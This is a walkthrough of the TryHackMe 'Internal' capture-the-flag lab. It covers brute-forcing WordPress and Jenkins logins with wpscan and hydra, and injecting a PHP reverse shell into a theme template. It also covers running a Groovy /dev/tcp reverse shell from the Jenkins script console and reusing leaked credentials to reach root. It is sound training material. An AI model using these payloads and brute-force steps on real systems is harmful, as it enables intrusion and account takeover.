# [Internal](https://tryhackme.com/room/internal)

## Penetration Testing Challenge

# Pre-engagement Briefing

You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in three weeks.

**Scope of Work**

The client requests that an engineer conducts an external, web app, and internal assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test). The client has asked that you secure two flags (no location provided) as proof of exploitation:

- User.txt
- Root.txt

Additionally, the client has provided the following scope allowances:

- Ensure that you modify your hosts file to reflect internal.thm
- Any tools or techniques are permitted in this engagement
- Locate and note all vulnerabilities found
- Submit the flags discovered to the dashboard
- Only the IP address assigned to your machine is in scope

(Roleplay off)

I encourage you to approach this challenge as an actual penetration test. Consider writing a report, to include an executive summary, vulnerability and exploitation assessment, and remediation suggestions, as this will benefit you in preparation for the eLearnsecurity eCPPT or career as a penetration tester in the field.

Note - this room can be completed without Metasploit

# Deploy and Engage the Client Environment

## Having accepted the project, you are provided with the client assessment environment. Secure the User and Root flags and submit them to the dashboard as proof of exploitation.

### User.txt Flag

1. Configure DNS resolution for the target domain by adding an entry to the hosts file.

```bash
echo "<TARGET_IP> internal.thm" >> /etc/hosts
```

2. Execute a service version detection scan to identify open ports and running services on the target.

```bash
nmap -sV internal.thm
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-27 16:58 CET
Nmap scan report for 10.82.136.94
Host is up (0.064s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

3. Use gobuster to discover hidden directories and files on the web server.

```bash
gobuster dir -u internal.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

<img width="888" height="405" alt="SCREEN01" src="https://github.com/user-attachments/assets/ddecaa90-efb5-4d35-a663-3efa752dfa90" />

4. Navigate to `http://internal.thm/blog` and enumerate users. Visiting `http://internal.thm/blog/index.php/author/admin/` confirms the existence of a user account named `admin`.

5. Perform deeper directory scanning on the WordPress installation to identify accessible endpoints.

```bash
gobuster dir -u internal.thm/blog -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

<img width="866" height="368" alt="SCREEN02" src="https://github.com/user-attachments/assets/edef31d9-ae8b-4580-87c8-f9ff8776704f" />

6. Execute a password attack against the identified admin account using wpscan with the rockyou wordlist.

```bash
wpscan --url internal.thm/blog -U admin -P /usr/share/wordlists/rockyou.txt
```

<img width="1010" height="112" alt="SCREEN03" src="https://github.com/user-attachments/assets/a117d02b-26d8-4f27-9565-3bb3e0a3edc6" />

**Results**: Valid credentials discovered - `admin:my2boys`

7. Authenticate to the WordPress admin panel at `http://internal.thm/blog/wp-admin/` using the compromised credentials. Navigate to `Appearance > Theme Editor > 404 Template (404.php)` and inject a PHP reverse shell payload.

```php
<?php
$ip = '<ATTACKER_IP>';
$port = 4444;

$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i', array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
?>
```

Click "Update File" to save the malicious template.

8. Set up a listener on the attacking machine to catch the incoming reverse shell connection.

```bash
nc -lvnp 4444
```

9. Navigate to a non-existent page to trigger the 404 error handler, which now contains the reverse shell code. Example URL: `http://internal.thm/blog/index.php/author/admin2/`

10. Search for sensitive information and credentials stored on the filesystem.

```bash
ls /opt
cat /opt/wp-save.txt
```

```
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
```

11. Upgrade the shell and switch to the aubreanna user account using the discovered credentials.

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
su aubreanna
# Password: bubb13guM!@#123
```

12. Navigate to the user's home directory and retrieve the first flag.

```bash
cd /home/aubreanna
cat user.txt
```

<img width="282" height="97" alt="SCREEN04" src="https://github.com/user-attachments/assets/4007a58c-deec-4bf4-80c3-dcfc4dc0e195" />

---

### Root.txt Flag

1. Examine files in the user's home directory to identify additional attack vectors.

```bash
cat jenkins.txt
```

```
Internal Jenkins service is running on 172.17.0.2:8080
```

2. Create an SSH tunnel to forward local traffic to the internal Jenkins service through the compromised SSH access.

```bash
ssh -L 8080:172.17.0.2:8080 aubreanna@<TARGET_IP>
```

3. Access the Jenkins login page at `http://127.0.0.1:8080/login` and perform a password brute force attack using hydra.

```bash
hydra 127.0.0.1 -s 8080 -V -f http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password" -l admin -P /usr/share/wordlists/rockyou.txt
```

Valid credentials discovered - `admin:spongebob`

4. Authenticate to Jenkins and navigate to `Manage Jenkins > Script Console`. Execute a Groovy script to establish a reverse shell from the Jenkins container.

```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<ATTACKER_IP>/5555;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

5. Set up another listener to receive the connection from the Jenkins container.

```bash
nc -lvnp 5555
```

6. Search the container filesystem for sensitive information and credentials.

```bash
cat /opt/note.txt
```

```
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you
need access to the root user account.

root:tr0ub13guM!@#123
```

7. Exit the container shell and establish an SSH connection as root to the target machine.

```bash
ssh root@<TARGET_IP>
# Password: tr0ub13guM!@#123
ls
cat root.txt
```

<img width="523" height="92" alt="SCREEN06" src="https://github.com/user-attachments/assets/31de61ad-87bf-456b-8592-e5f5ffcb8ca1" />
